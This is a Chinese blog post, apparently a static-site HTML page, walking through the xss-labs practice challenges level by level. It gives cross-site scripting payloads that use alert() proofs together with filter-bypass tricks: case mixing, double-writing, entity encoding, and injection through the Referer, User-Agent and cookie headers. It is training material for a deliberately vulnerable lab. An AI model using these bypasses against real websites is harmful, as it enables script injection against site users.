@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Yoghurt</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="xss-labs过关教程第一关它将name的参数值，插入到了 标签之间，所以这里直接在name参数中赋值一个简单的弹窗来进行测试。name参数重新赋值：alert(&#39;xss&#39;) 第二关将属性的引号和标签先闭合将keyword的参数值重新赋值”&gt;alert(&#39;xss&#39;)&#x2F;&#x2F; 第三关利用输入框鼠标事件通过标签的一些特殊事件来执行js代码构造代码：level3.php?keyword&#x3D;’onfoc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yoghurt">
+<meta property="og:url" content="http://example.com/2022/04/20/xss%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Yoghurt">
+<meta property="og:description" content="xss-labs过关教程第一关它将name的参数值，插入到了 标签之间，所以这里直接在name参数中赋值一个简单的弹窗来进行测试。name参数重新赋值：alert(&#39;xss&#39;) 第二关将属性的引号和标签先闭合将keyword的参数值重新赋值”&gt;alert(&#39;xss&#39;)&#x2F;&#x2F; 第三关利用输入框鼠标事件通过标签的一些特殊事件来执行js代码构造代码：level3.php?keyword&#x3D;’onfoc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/ral4Q.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/ra5N4.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/razfB.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/ra7t7.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/rasGM.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/raccg.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/ramN1.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/raT4C.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/ra3it.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/rakgq.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/raKse.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/raOVO.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/rantP.png">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/20/ra1am.png">
+<meta property="article:published_time" content="2022-04-20T07:02:49.235Z">
+<meta property="article:modified_time" content="2022-04-20T08:56:03.092Z">
+<meta property="article:author" content="GXY BLOG">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.328888.xyz/2022/04/20/ral4Q.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Yoghurt" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.1"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">GXY BLOG</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">myblog</a></li>
+				        
+							<li><a href="/archives">overview</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">myblog</a></li>
+		        
+					<li><a href="/archives">overview</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-xss攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/20/xss%E6%94%BB%E5%87%BB/" class="article-date">
+  	<time datetime="2022-04-20T07:02:49.235Z" itemprop="datePublished">2022-04-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="xss-labs过关教程"><a href="#xss-labs过关教程" class="headerlink" title="xss-labs过关教程"></a>xss-labs过关教程</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>它将name的参数值，插入到了<h2> </h2>标签之间，所以这里直接在name参数<br>中赋值一个简单的弹窗来进行测试。<br>name参数重新赋值：<script>alert('xss')</script><br><img src="https://s1.328888.xyz/2022/04/20/ral4Q.png"></p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>将属性的引号和标签先闭合<br>将keyword的参数值重新赋值”&gt;<script>alert('xss')</script>//<br><img src="https://s1.328888.xyz/2022/04/20/ra5N4.png"></p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>利用输入框鼠标事件<br>通过<input>标签的一些特殊事件来执行js代码<br>构造代码：level3.php?keyword=’onfocus=javascript:alert(‘xss’) &gt; //&amp;submit=搜索<br>没有直接弹窗，这是因为onfocus事件的特殊性造成的，点击当前页面的输入框就可以完成弹框了<br><img src="https://s1.328888.xyz/2022/04/20/razfB.png"></p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>第四关跟第三关一样，换成双引号<br><img src="https://s1.328888.xyz/2022/04/20/ra7t7.png"></p>
+<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>onclick被转义了，查看源代码，把on过滤成o_n了<br>可以用另外标签（超链接）来实现<br>输入：”&gt;<a href="javascript:alert(1)">点我<br>然后点击点我超链接<br><img src="https://s1.328888.xyz/2022/04/20/rasGM.png"></p>
+<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>过滤了href，可用大小写绕过。<br>输入：”&gt;<a HrEf="javascript:alert(1)">点我<br><img src="https://s1.328888.xyz/2022/04/20/raccg.png"></p>
+<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>双写绕过，即有些有些检测只检测一次，我们只需要再写一次就可以绕过<br>输入：”&gt;<a hhrefref="javascrscriptipt:alert(1)">点我<br><img src="https://s1.328888.xyz/2022/04/20/ramN1.png"></p>
+<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>把script过滤成scr_ipt<br>Unicode编码绕过<br>将JavaScript:alert(1)Unicode编码得到&#74;&#97;&#118;&#97;&#83;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;<br><img src="https://s1.328888.xyz/2022/04/20/raT4C.png"></p>
+<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>将JavaScript:alert(1)Unicode编码得到&#74;&#97;&#118;&#97;&#83;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;<br>此时发现它说链接不合法，<br>因为添加了检测是否有http://<br>于是我们在后面添加http://，但发现友情链接点击不了<br>原因是http与JavaScript:alert(1)在一起有干扰，注释掉即可<br><img src="https://s1.328888.xyz/2022/04/20/ra3it.png"></p>
+<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>需要加上type=“text”（详情），来显示搜索框<br>原因：由于hidden函数是隐藏属性不能在页面中触发xss,并且我们使用onclick需要搜索框来触发，所以添加type=”text”让输入框在页面显示<br>输入：<a target="_blank" rel="noopener" href="http://158.247.233.5:8962/level10.php?keyword=wel">http://158.247.233.5:8962/level10.php?keyword=wel</a> done!&amp;t_sort=”type=”text” onclick=”alert(1)”<br><img src="https://s1.328888.xyz/2022/04/20/rakgq.png"></p>
+<h3 id="十一关"><a href="#十一关" class="headerlink" title="十一关"></a>十一关</h3><p>t_sort仍然是接受参数值的，但是里面的双引号被编码了，这样浏览器只能正常显示字符但是却无法起到闭合的作用了。<br>提交：?keyword=good job!&amp;t_link=”type=”text&amp;t_history=”type=”text&amp;t_sort=”type=”text&amp;t_ref=”type=”text<br>burp抓包，加上referer字段：”type=”text” onclick=”alert(1)”<br><img src="https://s1.328888.xyz/2022/04/20/raKse.png"></p>
+<h3 id="十二关"><a href="#十二关" class="headerlink" title="十二关"></a>十二关</h3><p>提交：?keyword=good job!&amp;t_link=”type=”text&amp;t_history=”type=”text&amp;t_sort=”type=”text&amp;t_ref=”type=”text<br>burp抓包，修改user_Agent字段为：”type=”text” onclick=”alert(1)”<br><img src="https://s1.328888.xyz/2022/04/20/raOVO.png"></p>
+<h3 id="十三关"><a href="#十三关" class="headerlink" title="十三关"></a>十三关</h3><p>提交：?keyword=good job!&amp;t_link=”type=”text&amp;t_history=”type=”text&amp;t_sort=”type=”text&amp;t_ref=”type=”text<br>burp抓包，修改cookie字段为：user=call+me+maybe%3F “type=”text” onclick=”alert(1)”<br><img src="https://s1.328888.xyz/2022/04/20/rantP.png"></p>
+<h3 id="十五关"><a href="#十五关" class="headerlink" title="十五关"></a>十五关</h3><p>。。。<br>输入：?src=’level1.php?name=<img src=1 onerror=alert(1)>‘<br><img src="https://s1.328888.xyz/2022/04/20/ra1am.png"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/04/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件上传漏洞</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2022 GXY BLOG
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
